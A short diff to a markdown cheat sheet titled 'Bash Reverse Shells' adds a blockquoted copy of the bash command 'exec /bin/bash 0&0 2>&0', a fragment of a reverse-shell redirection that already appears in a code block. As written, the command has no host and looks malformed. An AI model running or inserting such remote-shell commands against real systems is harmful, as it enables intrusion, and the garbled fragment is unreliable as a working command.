@@ -1,4 +1,5 @@
 # Bash Reverse Shells
+> exec /bin/bash 0&0 2>&0
 
 ```bash
 exec /bin/bash 0&0 2>&0
